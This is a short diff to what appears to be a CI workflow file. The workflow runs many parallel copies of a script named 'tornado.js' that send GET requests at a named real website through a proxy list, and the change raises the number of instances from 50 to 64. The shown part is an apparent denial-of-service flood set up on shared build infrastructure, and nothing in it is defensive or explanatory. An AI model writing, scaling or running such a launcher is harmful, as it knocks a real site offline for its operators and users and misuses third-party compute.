@@ -20,8 +20,8 @@ jobs:
           npm i hpack
           chmod +x tornado.js
           PIDS=()
-          for i in {1..50}; do
-            timeout 50 node tornado.js GET https://hexbear.xyz/ 50 8 90 proxies.txt --full --query 3
+          for i in {1..64}; do
+            timeout 50 node tornado.js GET https://hexbear.xyz/ 50 9 90 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
